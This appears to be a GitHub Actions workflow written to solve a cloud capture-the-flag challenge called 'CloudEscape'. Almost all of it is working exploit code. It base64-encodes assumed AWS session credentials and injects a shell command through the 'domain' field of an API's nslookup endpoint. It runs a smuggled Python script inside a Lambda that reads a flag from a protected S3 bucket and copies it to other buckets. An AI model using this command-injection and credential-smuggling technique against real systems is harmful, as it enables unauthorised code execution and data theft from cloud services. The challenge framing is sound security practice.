name: CloudEscape Stage 1 - Get Flag v7
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: ALL IN ONE - Inject complete script with error capture
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Prepare creds
          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Create the complete Python script that:
          # 1. Tries S3 with Lambda's own role
          # 2. Tries S3 with cicdRole creds
          # 3. Writes flag to platform bucket
          # 4. Writes all errors to platform bucket as error.txt
          cat > /tmp/complete.py << 'PYEOF'
          import os,base64,boto3,traceback,json,time

          results = {}

          # Test 1: Lambda own role - can we list S3?
          try:
              c1 = boto3.client('s3', region_name='us-east-1')
              r = c1.list_buckets()
              results['own_list'] = [b['Name'] for b in r['Buckets']]
          except Exception as e:
              results['own_list_err'] = str(e)[:300]

          # Test 2: Lambda own role - can we get flag from codec bucket?
          try:
              c1 = boto3.client('s3', region_name='us-east-1')
              r = c1.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
              flag = r['Body'].read()
              results['own_flag'] = flag.decode().strip()
              # Write to platform bucket
              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
              results['own_put'] = 'OK'
          except Exception as e:
              results['own_flag_err'] = str(e)[:300]

          # Test 3: cicdRole creds - can we get flag?
          try:
              a = base64.b64decode(os.environ['A']).decode()
              s = base64.b64decode(os.environ['S']).decode()
              t = base64.b64decode(os.environ['T']).decode()
              se = boto3.Session(aws_access_key_id=a, aws_secret_access_key=s, aws_session_token=t, region_name='us-east-1')
              c2 = se.client('s3')
              r = c2.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
              flag = r['Body'].read()
              results['cicd_flag'] = flag.decode().strip()
              # Write to platform bucket
              c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
              results['cicd_put'] = 'OK'
              # Also write to site bucket
              c2.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
              results['cicd_site'] = 'OK'
          except Exception as e:
              results['cicd_flag_err'] = str(e)[:300]

          # Write results to platform bucket (using whichever client we have)
          try: 
              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
          except:
              try:
                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
              except Exception as e2:
                  results['write_err'] = str(e2)[:300]

          print(json.dumps(results))
          PYEOF

          export SCRIPT_B64=$(base64 -w0 /tmp/complete.py)
          
          # Build the complete payload in Python
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          a = os.environ['AKID_B64']
          s = os.environ['SKID_B64']
          t = os.environ['TOKEN_B64']
          sc = os.environ['SCRIPT_B64']
          
          cmd = f"x; export A={a} S={s} T={t}; echo {sc}|base64 -d>/tmp/c.py; python3 /tmp/c.py 2>&1"
          
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Sending complete script ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          echo "Waiting 15s for Lambda timeout..."
          sleep 15

      - name: Check results
        run: |
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== Read results.json ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/results.json - --region us-east-1 2>&1
          echo
          
          echo "===== Read flag.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
          echo
          
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          
          echo "===== Read flag from site ====="
          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1